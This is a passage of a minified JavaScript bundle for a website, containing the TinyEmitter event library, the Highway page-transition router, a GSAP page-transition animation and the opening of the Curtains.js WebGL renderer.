    t.exports = function (t) {
      return (
        s >= 51 ||
        !i(function () {
          var e = [];
          return (
            ((e.constructor = {})[o] = function () {
              return { foo: 1 };
            }),
            1 !== e[t](Boolean).foo
          );
        })
      );
    };
  },
  function (t, e, r) {
    var i = r(17);
    t.exports = i("navigator", "userAgent") || "";
  },
  function (t, e, r) {},
  function (t, e, r) {
    "use strict";
    function i() {}
    r.r(e),
      (i.prototype = {
        on: function (t, e, r) {
          var i = this.e || (this.e = {});
          return (i[t] || (i[t] = [])).push({ fn: e, ctx: r }), this;
        },
        once: function (t, e, r) {
          var i = this;
          function n() {
            i.off(t, n), e.apply(r, arguments);
          }
          return (n._ = e), this.on(t, n, r);
        },
        emit: function (t) {
          for (
            var e = [].slice.call(arguments, 1),
              r = ((this.e || (this.e = {}))[t] || []).slice(),
              i = 0,
              n = r.length;
            i < n;
            i++
          )
            r[i].fn.apply(r[i].ctx, e);
          return this;
        },
        off: function (t, e) {
          var r = this.e || (this.e = {}),
            i = r[t],
            n = [];
          if (i && e)
            for (var s = 0, o = i.length; s < o; s++)
              i[s].fn !== e && i[s].fn._ !== e && n.push(i[s]);
          return n.length ? (r[t] = n) : delete r[t], this;
        },
      });
    var n = i;
    n.TinyEmitter = i;
    var s = function (t) {
      (this.wrap = document.querySelector("[data-router-wrapper]")),
        (this.properties = t),
        (this.Transition = t.transition
          ? new t.transition.class(this.wrap, t.transition.name)
          : null);
    };
    (s.prototype.setup = function () {
      this.onEnter && this.onEnter(),
        this.onEnterCompleted && this.onEnterCompleted();
    }),
      (s.prototype.add = function () {
        this.wrap.insertAdjacentHTML(
          "beforeend",
          this.properties.view.outerHTML
        );
      }),
      (s.prototype.update = function () {
        document.title = this.properties.page.title;
      }),
      (s.prototype.show = function (t) {
        var e = this;
        return new Promise(function (r) {
          try {
            function i(t) {
              e.onEnterCompleted && e.onEnterCompleted(), r();
            }
            return (
              e.update(),
              e.onEnter && e.onEnter(),
              Promise.resolve(
                e.Transition
                  ? Promise.resolve(e.Transition.show(t)).then(i)
                  : i()
              )
            );
          } catch (t) {
            return Promise.reject(t);
          }
        });
      }),
      (s.prototype.hide = function (t) {
        var e = this;
        return new Promise(function (r) {
          try {
            function i(t) {
              e.onLeaveCompleted && e.onLeaveCompleted(), r();
            }
            return (
              e.onLeave && e.onLeave(),
              Promise.resolve(
                e.Transition
                  ? Promise.resolve(e.Transition.hide(t)).then(i)
                  : i()
              )
            );
          } catch (t) {
            return Promise.reject(t);
          }
        });
      });
    var o = new window.DOMParser(),
      a = function (t, e) {
        (this.renderers = t), (this.transitions = e);
      };
    (a.prototype.getOrigin = function (t) {
      var e = t.match(/(https?:\/\/[\w\-.]+)/);
      return e ? e[1].replace(/https?:\/\//, "") : null;
    }),
      (a.prototype.getPathname = function (t) {
        var e = t.match(/https?:\/\/.*?(\/[\w_\-./]+)/);
        return e ? e[1] : "/";
      }),
      (a.prototype.getAnchor = function (t) {
        var e = t.match(/(#.*)$/);
        return e ? e[1] : null;
      }),
      (a.prototype.getParams = function (t) {
        var e = t.match(/\?([\w_\-.=&]+)/);
        if (!e) return null;
        for (var r = e[1].split("&"), i = {}, n = 0; n < r.length; n++) {
          var s = r[n].split("=");
          i[s[0]] = s[1];
        }
        return i;
      }),
      (a.prototype.getDOM = function (t) {
        return "string" == typeof t ? o.parseFromString(t, "text/html") : t;
      }),
      (a.prototype.getView = function (t) {
        return t.querySelector("[data-router-view]");
      }),
      (a.prototype.getSlug = function (t) {
        return t.getAttribute("data-router-view");
      }),
      (a.prototype.getRenderer = function (t) {
        if (!this.renderers) return Promise.resolve(s);
        if (t in this.renderers) {
          var e = this.renderers[t];
          return "function" != typeof e || s.isPrototypeOf(e)
            ? "function" == typeof e.then
              ? Promise.resolve(e).then(function (t) {
                  return t.default;
                })
              : Promise.resolve(e)
            : Promise.resolve(e()).then(function (t) {
                return t.default;
              });
        }
        return Promise.resolve(s);
      }),
      (a.prototype.getTransition = function (t) {
        return this.transitions
          ? t in this.transitions
            ? { class: this.transitions[t], name: t }
            : "default" in this.transitions
            ? { class: this.transitions.default, name: "default" }
            : null
          : null;
      }),
      (a.prototype.getProperties = function (t) {
        var e = this.getDOM(t),
          r = this.getView(e),
          i = this.getSlug(r);
        return {
          page: e,
          view: r,
          slug: i,
          renderer: this.getRenderer(i, this.renderers),
          transition: this.getTransition(i, this.transitions),
        };
      }),
      (a.prototype.getLocation = function (t) {
        return {
          href: t,
          anchor: this.getAnchor(t),
          origin: this.getOrigin(t),
          params: this.getParams(t),
          pathname: this.getPathname(t),
        };
      });
    var l = (function (t) {
        function e(e) {
          var r = this;
          void 0 === e && (e = {});
          var i = e.renderers,
            n = e.transitions;
          t.call(this),
            (this.Helpers = new a(i, n)),
            (this.Transitions = n),
            (this.Contextual = !1),
            (this.location = this.Helpers.getLocation(window.location.href)),
            (this.properties = this.Helpers.getProperties(
              document.cloneNode(!0)
            )),
            (this.popping = !1),
            (this.running = !1),
            (this.trigger = null),
            (this.cache = new Map()),
            this.cache.set(this.location.href, this.properties),
            this.properties.renderer.then(function (t) {
              (r.From = new t(r.properties)), r.From.setup();
            }),
            (this._navigate = this.navigate.bind(this)),
            window.addEventListener("popstate", this.popState.bind(this)),
            (this.links = document.querySelectorAll(
              "a:not([target]):not([data-router-disabled])"
            )),
            this.attach(this.links);
        }
        return (
          t && (e.__proto__ = t),
          ((e.prototype = Object.create(t && t.prototype)).constructor = e),
          (e.prototype.attach = function (t) {
            for (var e = 0, r = t; e < r.length; e += 1)
              r[e].addEventListener("click", this._navigate);
          }),
          (e.prototype.detach = function (t) {
            for (var e = 0, r = t; e < r.length; e += 1)
              r[e].removeEventListener("click", this._navigate);
          }),
          (e.prototype.navigate = function (t) {
            if (!t.metaKey && !t.ctrlKey) {
              t.preventDefault();
              var e =
                !!t.currentTarget.hasAttribute("data-transition") &&
                t.currentTarget.dataset.transition;
              this.redirect(t.currentTarget.href, e, t.currentTarget);
            }
          }),
          (e.prototype.redirect = function (t, e, r) {
            if (
              (void 0 === e && (e = !1),
              void 0 === r && (r = "script"),
              (this.trigger = r),
              !this.running && t !== this.location.href)
            ) {
              var i = this.Helpers.getLocation(t);
              (this.Contextual = !1),
                e &&
                  ((this.Contextual = this.Transitions.contextual[e].prototype),
                  (this.Contextual.name = e)),
                i.origin !== this.location.origin ||
                (i.anchor && i.pathname === this.location.pathname)
                  ? (window.location.href = t)
                  : ((this.location = i), this.beforeFetch());
            }
          }),
          (e.prototype.popState = function () {
            (this.trigger = "popstate"), (this.Contextual = !1);
            var t = this.Helpers.getLocation(window.location.href);
            this.location.pathname !== t.pathname ||
            (!this.location.anchor && !t.anchor)
              ? ((this.popping = !0), (this.location = t), this.beforeFetch())
              : (this.location = t);
          }),
          (e.prototype.pushState = function () {
            this.popping ||
              window.history.pushState(this.location, "", this.location.href);
          }),
          (e.prototype.fetch = function () {
            try {
              var t = this;
              return Promise.resolve(
                fetch(t.location.href, {
                  mode: "same-origin",
                  method: "GET",
                  headers: { "X-Requested-With": "Highway" },
                  credentials: "same-origin",
                })
              ).then(function (e) {
                if (e.status >= 200 && e.status < 300) return e.text();
                window.location.href = t.location.href;
              });
            } catch (t) {
              return Promise.reject(t);
            }
          }),
          (e.prototype.beforeFetch = function () {
            try {
              var t = this;
              function e() {
                t.afterFetch();
              }
              t.pushState(),
                (t.running = !0),
                t.emit("NAVIGATE_OUT", {
                  from: {
                    page: t.From.properties.page,
                    view: t.From.properties.view,
                  },
                  trigger: t.trigger,
                  location: t.location,
                });
              var r = { trigger: t.trigger, contextual: t.Contextual },
                i = t.cache.has(t.location.href)
                  ? Promise.resolve(t.From.hide(r)).then(function () {
                      t.properties = t.cache.get(t.location.href);
                    })
                  : Promise.resolve(
                      Promise.all([t.fetch(), t.From.hide(r)])
                    ).then(function (e) {
                      (t.properties = t.Helpers.getProperties(e[0])),
                        t.cache.set(t.location.href, t.properties);
                    });
              return Promise.resolve(i && i.then ? i.then(e) : e());
            } catch (t) {
              return Promise.reject(t);
            }
          }),
          (e.prototype.afterFetch = function () {
            try {
              var t = this;
              return Promise.resolve(t.properties.renderer).then(function (e) {
                return (
                  (t.To = new e(t.properties)),
                  t.To.add(),
                  t.emit("NAVIGATE_IN", {
                    to: {
                      page: t.To.properties.page,
                      view: t.To.wrap.lastElementChild,
                    },
                    trigger: t.trigger,
                    location: t.location,
                  }),
                  Promise.resolve(
                    t.To.show({ trigger: t.trigger, contextual: t.Contextual })
                  ).then(function () {
                    (t.popping = !1),
                      (t.running = !1),
                      t.detach(t.links),
                      (t.links = document.querySelectorAll(
                        "a:not([target]):not([data-router-disabled])"
                      )),
                      t.attach(t.links),
                      t.emit("NAVIGATE_END", {
                        to: {
                          page: t.To.properties.page,
                          view: t.To.wrap.lastElementChild,
                        },
                        from: {
                          page: t.From.properties.page,
                          view: t.From.properties.view,
                        },
                        trigger: t.trigger,
                        location: t.location,
                      }),
                      (t.From = t.To),
                      (t.trigger = null);
                  })
                );
              });
            } catch (t) {
              return Promise.reject(t);
            }
          }),
          e
        );
      })(n),
      h = function (t, e) {
        (this.wrap = t), (this.name = e);
      };
    (h.prototype.show = function (t) {
      var e = this,
        r = t.trigger,
        i = t.contextual,
        n = this.wrap.lastElementChild,
        s = this.wrap.firstElementChild;
      return new Promise(function (t) {
        i
          ? (n.setAttribute("data-transition-in", i.name),
            n.removeAttribute("data-transition-out", i.name),
            i.in && i.in({ to: n, from: s, trigger: r, done: t }))
          : (n.setAttribute("data-transition-in", e.name),
            n.removeAttribute("data-transition-out", e.name),
            e.in && e.in({ to: n, from: s, trigger: r, done: t }));
      });
    }),
      (h.prototype.hide = function (t) {
        var e = this,
          r = t.trigger,
          i = t.contextual,
          n = this.wrap.firstElementChild;
        return new Promise(function (t) {
          i
            ? (n.setAttribute("data-transition-out", i.name),
              n.removeAttribute("data-transition-in", i.name),
              i.out && i.out({ from: n, trigger: r, done: t }))
            : (n.setAttribute("data-transition-out", e.name),
              n.removeAttribute("data-transition-in", e.name),
              e.out && e.out({ from: n, trigger: r, done: t }));
        });
      }),
      console.log("Highway v2.2.0");
    var u,
      c,
      d,
      p = { Core: l, Helpers: a, Renderer: s, Transition: h },
      f =
        (r(46),
        r(64),
        r(65),
        r(40),
        r(69),
        r(70),
        r(71),
        r(72),
        r(73),
        r(74),
        r(0)),
      g = r(6);
    function m(t) {
      return (m =
        "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
          ? function (t) {
              return typeof t;
            }
          : function (t) {
              return t &&
                "function" == typeof Symbol &&
                t.constructor === Symbol &&
                t !== Symbol.prototype
                ? "symbol"
                : typeof t;
            })(t);
    }
    function v(t, e) {
      for (var r = 0; r < e.length; r++) {
        var i = e[r];
        (i.enumerable = i.enumerable || !1),
          (i.configurable = !0),
          "value" in i && (i.writable = !0),
          Object.defineProperty(t, i.key, i);
      }
    }
    function y(t, e) {
      return (y =
        Object.setPrototypeOf ||
        function (t, e) {
          return (t.__proto__ = e), t;
        })(t, e);
    }
    function D(t) {
      var e = (function () {
        if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
        if (Reflect.construct.sham) return !1;
        if ("function" == typeof Proxy) return !0;
        try {
          return (
            Date.prototype.toString.call(
              Reflect.construct(Date, [], function () {})
            ),
            !0
          );
        } catch (t) {
          return !1;
        }
      })();
      return function () {
        var r,
          i = b(t);
        if (e) {
          var n = b(this).constructor;
          r = Reflect.construct(i, arguments, n);
        } else r = i.apply(this, arguments);
        return (function x(t, e) {
          return !e || ("object" !== m(e) && "function" != typeof e)
            ? (function (t) {
                if (void 0 === t)
                  throw new ReferenceError(
                    "this hasn't been initialised - super() hasn't been called"
                  );
                return t;
              })(t)
            : e;
        })(this, r);
      };
    }
    function b(t) {
      return (b = Object.setPrototypeOf
        ? Object.getPrototypeOf
        : function (t) {
            return t.__proto__ || Object.getPrototypeOf(t);
          })(t);
    }
    f.gsap.registerPlugin(g.ExpoScaleEase);
    var w = document.querySelector(".js-mask"),
      T = (function (t) {
        !(function (t, e) {
          if ("function" != typeof e && null !== e)
            throw new TypeError(
              "Super expression must either be null or a function"
            );
          (t.prototype = Object.create(e && e.prototype, {
            constructor: { value: t, writable: !0, configurable: !0 },
          })),
            e && y(t, e);
        })(s, t);
        var e,
          r,
          n = D(s);
        function s() {
          return (
            (function _(t, e) {
              if (!(t instanceof e))
                throw new TypeError("Cannot call a class as a function");
            })(this, s),
            n.apply(this, arguments)
          );
        }
        return (
          (e = s),
          (r = [
            {
              key: "out",
              value: function (t) {
                t.from;
                var e = t.done;
                document.querySelector("canvas"),
                  (u = document.querySelector(".js-header")),
                  (c = document.querySelector(".js-transition")),
                  (d = document.querySelector(".js-progress")),
                  f.gsap.to(c, 1.25, {
                    opacity: 1,
                    ease: "expo.out",
                    onComplete: function () {
                      e();
                    },
                  }),
                  window.innerWidth >= 1024 &&
                    f.gsap.to(u, 1.25, { opacity: 0, ease: "expo.out" }),
                  (d.style.opacity = 0),
                  (w.style.pointerEvents = "all");
              },
            },
            {
              key: "in",
              value: function (t) {
                var e = t.from,
                  r = (t.to, t.done);
                setTimeout(function () {
                  w.style.pointerEvents = "none";
                }, 500),
                  e.remove(),
                  window.scrollTo(0, 0),
                  r();
                var i = document.querySelector(".js-about"),
                  n = document.querySelector(".js-about-img"),
                  s = document.querySelector(".js-hero-ellipse svg path"),
                  o = document.querySelector(".js-project-info"),
                  a = document.querySelector(".js-project-title");
                setTimeout(function () {
                  s && (s.style = "");
                }, 300),
                  f.gsap.to(c, 1.5, { opacity: 0, ease: "expo.inOut" }),
                  i &&
                    setTimeout(function () {
                      (i.style.visibility = "visible"),
                        f.gsap.from(n, 3, {
                          yPercent: -100,
                          ease: "expo.inOut",
                        }),
                        f.gsap.from(n.querySelector("img"), 3, {
                          yPercent: 100,
                          ease: "expo.inOut",
                        });
                    }, 300),
                  o &&
                    f.gsap.from(a, 2, {
                      opacity: 0,
                      delay: 0.25,
                      ease: "expo.inOut",
                    });
              },
            },
          ]) && v(e.prototype, r),
          s
        );
      })(p.Transition),
      S = (r(44), r(102), r(45), r(79));
    let E = 0;
    function C() {
      if (!(E > 100)) {
        if (100 === E)
          console.warn("Curtains: too many warnings thrown, stop logging.");
        else {
          const t = Array.prototype.slice.call(arguments);
          console.warn.apply(console, t);
        }
        E++;
      }
    }
    function P() {
      const t = Array.prototype.slice.call(arguments);
      console.error.apply(console, t);
    }
    function F() {
      return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (t) => {
        let e = (16 * Math.random()) | 0;
        return ("x" === t ? e : (3 & e) | 8).toString(16).toUpperCase();
      });
    }
    function M(t) {
      return 0 == (t & (t - 1));
    }
    class R {
      constructor(t) {
        (this.type = "Scene"),
          t && "Renderer" === t.type
            ? t.gl || P(this.type + ": Renderer WebGL context is undefined", t)
            : P(this.type + ": Renderer not passed as first argument", t),
          (this.renderer = t),
          (this.gl = t.gl),
          this.initStacks();
      }
      initStacks() {
        this.stacks = {
          pingPong: [],
          renderTargets: [],
          opaque: [],
          transparent: [],
          renderPasses: [],
          scenePasses: [],
        };
      }
      resetPlaneStacks() {
        (this.stacks.pingPong = []),
          (this.stacks.renderTargets = []),
          (this.stacks.opaque = []),
          (this.stacks.transparent = []);
        for (let t = 0; t < this.renderer.planes.length; t++)
          this.addPlane(this.renderer.planes[t]);
      }
      resetShaderPassStacks() {
        (this.stacks.scenePasses = []), (this.stacks.renderPasses = []);
        for (let t = 0; t < this.renderer.shaderPasses.length; t++)
          (this.renderer.shaderPasses[t].index = t),
            this.renderer.shaderPasses[t]._isScenePass
              ? this.stacks.scenePasses.push(this.renderer.shaderPasses[t])
              : this.stacks.renderPasses.push(this.renderer.shaderPasses[t]);
        0 === this.stacks.scenePasses.length &&
          (this.renderer.state.scenePassIndex = null);
      }
      addToRenderTargetsStack(t) {
        const e = this.renderer.planes.filter(
          (e) => "PingPongPlane" !== e.type && e.target && e.uuid !== t.uuid
        );
        let r = -1;
        if (t.target._depth) {
          for (let i = e.length - 1; i >= 0; i--)
            if (e[i].target.uuid === t.target.uuid) {
              r = i + 1;
              break;
            }
        } else r = e.findIndex((e) => e.target.uuid === t.target.uuid);
        (r = Math.max(0, r)),
          e.splice(r, 0, t),
          t.target._depth
            ? (e.sort((t, e) => t.index - e.index),
              e.sort((t, e) => e.renderOrder - t.renderOrder))
            : (e.sort((t, e) => e.index - t.index),
              e.sort((t, e) => t.renderOrder - e.renderOrder)),
          e.sort((t, e) => t.target.index - e.target.index),
          (this.stacks.renderTargets = e);
      }
      addToRegularPlaneStack(t) {
        const e = this.renderer.planes.filter(
          (e) =>
            "PingPongPlane" !== e.type &&
            !e.target &&
            e._transparent === t._transparent &&
            e.uuid !== t.uuid
        );
        let r = -1;
        if (t.shareProgram) {
          for (let i = e.length - 1; i >= 0; i--)
            if (e[i]._program.id === t._program.id) {
              r = i + 1;
              break;
            }
        } else
          for (let i = e.length - 1; i >= 0; i--)
            if (e[i]._geometry.definition.id === t._geometry.definition.id) {
              r = i + 1;
              break;
            }
        return (
          (r = Math.max(0, r)),
          e.splice(r, 0, t),
          e.sort((t, e) => t.index - e.index),
          t.shareProgram && e.sort((t, e) => t._program.id - e._program.id),
          e
        );
      }
      addPlane(t) {
        if ("PingPongPlane" === t.type) this.stacks.pingPong.push(t);
        else if (t.target) this.addToRenderTargetsStack(t);
        else if (t._transparent) {
          const e = this.addToRegularPlaneStack(t);
          e.sort((t, e) => e.relativeTranslation.z - t.relativeTranslation.z),
            e.sort((t, e) => e.renderOrder - t.renderOrder),
            (this.stacks.transparent = e);
        } else {
          const e = this.addToRegularPlaneStack(t);
          e.sort((t, e) => e.renderOrder - t.renderOrder),
            (this.stacks.opaque = e);
        }
      }
      removePlane(t) {
        "PingPongPlane" === t.type
          ? (this.stacks.pingPong = this.stacks.pingPong.filter(
              (e) => e.uuid !== t.uuid
            ))
          : t.target
          ? (this.stacks.renderTargets = this.stacks.renderTargets.filter(
              (e) => e.uuid !== t.uuid
            ))
          : t._transparent
          ? (this.stacks.transparent = this.stacks.transparent.filter(
              (e) => e.uuid !== t.uuid
            ))
          : (this.stacks.opaque = this.stacks.opaque.filter(
              (e) => e.uuid !== t.uuid
            ));
      }
      setPlaneRenderOrder(t) {
        if ("ShaderPass" === t.type)
          this.sortShaderPassStack(
            t._isScenePass ? this.stacks.scenePasses : this.stacks.renderPasses
          );
        else if ("PingPongPlane" === t.type) return;
        if (t.target)
          t.target._depth
            ? (this.stacks.renderTargets.sort((t, e) => t.index - e.index),
              this.stacks.renderTargets.sort(
                (t, e) => e.renderOrder - t.renderOrder
              ))
            : (this.stacks.renderTargets.sort((t, e) => e.index - t.index),
              this.stacks.renderTargets.sort(
                (t, e) => t.renderOrder - e.renderOrder
              )),
            this.stacks.renderTargets.sort(
              (t, e) => t.target.index - e.target.index
            );
        else {
          const e = t._transparent
              ? this.stacks.transparent
              : this.stacks.opaque,
            r = this.stacks.scenePasses.find(
              (t, e) => t._isScenePass && !t._depth && 0 === e
            );
          !this.renderer.depth || r
            ? (e.sort((t, e) => e.index - t.index),
              t._transparent &&
                e.sort(
                  (t, e) => t.relativeTranslation.z - e.relativeTranslation.z
                ),
              e.sort((t, e) => t.renderOrder - e.renderOrder))
            : (e.sort((t, e) => t.index - e.index),
              t._transparent &&
                e.sort(
                  (t, e) => e.relativeTranslation.z - t.relativeTranslation.z
                ),
              e.sort((t, e) => e.renderOrder - t.renderOrder));
        }
      }
      addShaderPass(t) {
        t._isScenePass
          ? (this.stacks.scenePasses.push(t),
            this.sortShaderPassStack(this.stacks.scenePasses))
          : (this.stacks.renderPasses.push(t),
            this.sortShaderPassStack(this.stacks.renderPasses));
      }
      removeShaderPass(t) {
        this.resetShaderPassStacks();
      }
      sortShaderPassStack(t) {
        t.sort((t, e) => t.index - e.index),
          t.sort((t, e) => t.renderOrder - e.renderOrder);
      }
      enableShaderPass() {
        this.stacks.scenePasses.length &&
          0 === this.stacks.renderPasses.length &&
          this.renderer.planes.length &&
          ((this.renderer.state.scenePassIndex = 0),
          this.renderer.bindFrameBuffer(this.stacks.scenePasses[0].target));
      }
      drawRenderPasses() {
        this.stacks.scenePasses.length &&
          this.stacks.renderPasses.length &&
          this.renderer.planes.length &&
          ((this.renderer.state.scenePassIndex = 0),
          this.renderer.bindFrameBuffer(this.stacks.scenePasses[0].target));
        for (let t = 0; t < this.stacks.renderPasses.length; t++)
          this.stacks.renderPasses[t]._startDrawing(),
            this.renderer.clearDepth();
      }
      drawScenePasses() {
        for (let t = 0; t < this.stacks.scenePasses.length; t++)
          this.stacks.scenePasses[t]._startDrawing();
      }
      drawPingPongStack() {
        for (let t = 0; t < this.stacks.pingPong.length; t++) {
          const e = this.stacks.pingPong[t];
          e && e._startDrawing();
        }
      }
      drawStack(t) {
        for (let e = 0; e < this.stacks[t].length; e++) {
          const r = this.stacks[t][e];
          r && r._startDrawing();
        }
      }
      draw() {
        this.drawPingPongStack(),
          this.enableShaderPass(),
          this.drawStack("renderTargets"),
          this.drawRenderPasses(),
          this.drawStack("transparent"),
          this.drawStack("opaque"),
          this.drawScenePasses();
      }
    }
    class A {
      constructor() {
        (this.geometries = []), this.clear();
      }
      clear() {
        (this.textures = []), (this.programs = []);
      }
      getGeometryFromID(t) {
        return this.geometries.find((e) => e.id === t);
      }
      addGeometry(t, e, r) {
        this.geometries.push({ id: t, vertices: e, uvs: r });
      }
      isSameShader(t, e) {
        return 0 === t.localeCompare(e);
      }
      getProgramFromShaders(t, e) {
        return this.programs.find(
          (r) =>
            this.isSameShader(r.vsCode, t) && this.isSameShader(r.fsCode, e)
        );
      }
      addProgram(t) {
        this.programs.push(t);
      }
      getTextureFromSource(t) {
        return this.textures.find(
          (e) => e.source && e.source.src === t.src && e.uuid != e.uuid
        );
      }
      addTexture(t) {
        this.getTextureFromSource(t.source) || this.textures.push(t);
      }
      removeTexture(t) {
        this.textures = this.textures.filter((e) => e.uuid !== t.uuid);
      }
    }
    class O {
      constructor() {
        this.clear();
      }
      clear() {
        this.queue = [];
      }
      add(t, e = !1) {
        const r = { callback: t, keep: e, timeout: null };
        return (
          (r.timeout = setTimeout(() => {
            this.queue.push(r);
          }, 0)),
          r
        );
      }
      execute() {
        this.queue.map((t) => {
          t.callback && t.callback(), clearTimeout(this.queue.timeout);
        }),
          (this.queue = this.queue.filter((t) => t.keep));
      }
    }
    class k {
      constructor({
        alpha: t,
        antialias: e,
        premultipliedAlpha: r,
        depth: i,
        failIfMajorPerformanceCaveat: n,
        preserveDrawingBuffer: s,
        stencil: o,
        container: a,
        pixelRatio: l,
        renderingScale: h,
        production: u,
        onError: c,
        onContextLost: d,
        onContextRestored: p,
        onDisposed: f,
        onSceneChange: g,
      }) {
        (this.type = "Renderer"),
          (this.alpha = t),
          (this.antialias = e),
          (this.premultipliedAlpha = r),
          (this.depth = i),
          (this.failIfMajorPerformanceCaveat = n),
          (this.preserveDrawingBuffer = s),
          (this.stencil = o),
          (this.container = a),
          (this.pixelRatio = l),
          (this._renderingScale = h),
          (this.production = u),
          (this.onError = c),
          (this.onContextLost = d),
          (this.onContextRestored = p),
          (this.onDisposed = f),
          (this.onSceneChange = g),
          this.initState(),
          (this.canvas = document.createElement("canvas"));
        const m = {
          alpha: this.alpha,
          premultipliedAlpha: this.premultipliedAlpha,
          antialias: this.antialias,
          depth: this.depth,
          failIfMajorPerformanceCaveat: this.failIfMajorPerformanceCaveat,
          preserveDrawingBuffer: this.preserveDrawingBuffer,
          stencil: this.stencil,
        };
        if (
          ((this.gl = this.canvas.getContext("webgl2", m)),
          (this._isWebGL2 = !!this.gl),
          this.gl ||
            (this.gl =
              this.canvas.getContext("webgl", m) ||
              this.canvas.getContext("experimental-webgl", m)),
          !this.gl)
        )
          return (
            this.production ||
              C(this.type + ": WebGL context could not be created"),
            (this.state.isActive = !1),
            void (this.onError && this.onError())
          );
        this.initRenderer();
      }
      initState() {
        this.state = {
          isActive: !0,
          isContextLost: !0,
          drawingEnabled: !0,
          forceRender: !1,
          currentProgramID: null,
          currentGeometryID: null,
          forceBufferUpdate: !1,
          setDepth: null,
          cullFace: null,
          frameBufferID: null,
          scenePassIndex: null,
          activeTexture: null,
          unpackAlignment: null,
          flipY: null,
          premultiplyAlpha: null,
        };
      }
      initCallbackQueueManager() {
        this.nextRender = new O();
      }
      initRenderer() {
        (this.planes = []),
          (this.renderTargets = []),
          (this.shaderPasses = []),
          (this.state.isContextLost = !1),
          this.initCallbackQueueManager(),
          this.setBlendFunc(),
          this.setDepth(!0),
          (this.cache = new A()),
          (this.scene = new R(this)),
          this.getExtensions(),
          (this._contextLostHandler = this.contextLost.bind(this)),
          this.canvas.addEventListener(
            "webglcontextlost",
            this._contextLostHandler,
            !1
          ),
          (this._contextRestoredHandler = this.contextRestored.bind(this)),
          this.canvas.addEventListener(
            "webglcontextrestored",
            this._contextRestoredHandler,
            !1
          );
      }
      getExtensions() {
        (this.extensions = []),
          this._isWebGL2
            ? ((this.extensions.EXT_color_buffer_float = this.gl.getExtension(
                "EXT_color_buffer_float"
              )),
              (this.extensions.OES_texture_float_linear = this.gl.getExtension(
                "OES_texture_float_linear"
              )),
              (this.extensions.EXT_texture_filter_anisotropic =
                this.gl.getExtension("EXT_texture_filter_anisotropic")),
              (this.extensions.WEBGL_lose_context =
                this.gl.getExtension("WEBGL_lose_context")))
            : ((this.extensions.OES_vertex_array_object = this.gl.getExtension(
                "OES_vertex_array_object"
              )),
              (this.extensions.OES_texture_float =
                this.gl.getExtension("OES_texture_float")),
              (this.extensions.OES_texture_float_linear = this.gl.getExtension(
                "OES_texture_float_linear"
              )),
              (this.extensions.OES_texture_half_float = this.gl.getExtension(
                "OES_texture_half_float"
              )),
              (this.extensions.OES_texture_half_float_linear =
                this.gl.getExtension("OES_texture_half_float_linear")),
              (this.extensions.EXT_texture_filter_anisotropic =
                this.gl.getExtension("EXT_texture_filter_anisotropic")),
              (this.extensions.OES_element_index_uint = this.gl.getExtension(
                "OES_element_index_uint"
              )),
              (this.extensions.OES_standard_derivatives = this.gl.getExtension(
                "OES_standard_derivatives"
              )),
              (this.extensions.EXT_sRGB = this.gl.getExtension("EXT_sRGB")),
              (this.extensions.WEBGL_depth_texture = this.gl.getExtension(
                "WEBGL_depth_texture"
              )),
              (this.extensions.WEBGL_draw_buffers =
                this.gl.getExtension("WEBGL_draw_buffers")),
              (this.extensions.WEBGL_lose_context =
                this.gl.getExtension("WEBGL_lose_context")));
      }
      contextLost(t) {
        (this.state.isContextLost = !0),
          this.state.isActive &&
            (t.preventDefault(),
            this.nextRender.add(
              () => this.onContextLost && this.onContextLost()
            ));
      }
      restoreContext() {
        this.state.isActive &&
          (this.initState(),
          this.gl && this.extensions.WEBGL_lose_context
            ? this.extensions.WEBGL_lose_context.restoreContext()
            : (this.gl || this.production
                ? this.extensions.WEBGL_lose_context ||
                  this.production ||
                  C(
                    this.type +
                      ": Could not restore the context because the restore context extension is not defined"
                  )
                : C(
                    this.type +
                      ": Could not restore the context because the context is not defined"
                  ),
              this.onError && this.onError()));
      }
      isContextexFullyRestored() {
        let t = !0;
        for (let e = 0; e < this.renderTargets.length; e++) {
          this.renderTargets[e].textures[0]._canDraw || (t = !1);
          break;
        }
        if (t)
          for (let e = 0; e < this.planes.length; e++) {
            if (!this.planes[e]._canDraw) {
              t = !1;
              break;
            }
            for (let r = 0; r < this.planes[e].textures.length; r++)
              if (!this.planes[e].textures[r]._canDraw) {
                t = !1;
                break;
              }
          }
        if (t)
          for (let e = 0; e < this.shaderPasses.length; e++) {
            if (!this.shaderPasses[e]._canDraw) {
              t = !1;
              break;
            }
            for (let r = 0; r < this.shaderPasses[e].textures.length; r++)
              if (!this.shaderPasses[e].textures[r]._canDraw) {
                t = !1;
                break;
              }
          }
        return t;
      }
      contextRestored() {
        this.getExtensions(),
          this.setBlendFunc(),
          this.setDepth(!0),
          this.cache.clear(),
          this.scene.initStacks();
        for (let t = 0; t < this.renderTargets.length; t++)
          this.renderTargets[t]._restoreContext();
        for (let t = 0; t < this.planes.length; t++)
          this.planes[t]._restoreContext();
        for (let t = 0; t < this.shaderPasses.length; t++)
          this.shaderPasses[t]._restoreContext();
        const t = this.nextRender.add(() => {
          this.isContextexFullyRestored() &&
            ((t.keep = !1),
            (this.state.isContextLost = !1),
            this.onContextRestored && this.onContextRestored(),
            this.onSceneChange(),
            this.needRender());
        }, !0);
      }
      setPixelRatio(t) {
        this.pixelRatio = t;
      }
      setSize() {
        if (!this.gl) return;
        const t = this.container.getBoundingClientRect();
        this._boundingRect = {
          width: t.width * this.pixelRatio,
          height: t.height * this.pixelRatio,
          top: t.top * this.pixelRatio,
          left: t.left * this.pixelRatio,
        };
        const e = !!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/),
          r = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
        e &&
          r &&
          (this._boundingRect.top =
            (function (t) {
              let e = 0;
              for (; t && !isNaN(t.offsetTop); )
                (e += t.offsetTop - t.scrollTop), (t = t.offsetParent);
              return e;
            })(this.container) * this.pixelRatio),
          (this.canvas.style.width =
            Math.floor(this._boundingRect.width / this.pixelRatio) + "px"),
          (this.canvas.style.height =
            Math.floor(this._boundingRect.height / this.pixelRatio) + "px"),
          (this.canvas.width = Math.floor(
            this._boundingRect.width * this._renderingScale
          )),
          (this.canvas.height = Math.floor(
            this._boundingRect.height * this._renderingScale
          )),
          this.gl.viewport(
            0,
            0,
            this.gl.drawingBufferWidth,
            this.gl.drawingBufferHeight
          );
      }
      resize() {
        for (let t = 0; t < this.planes.length; t++)
          this.planes[t]._canDraw && this.planes[t].resize();
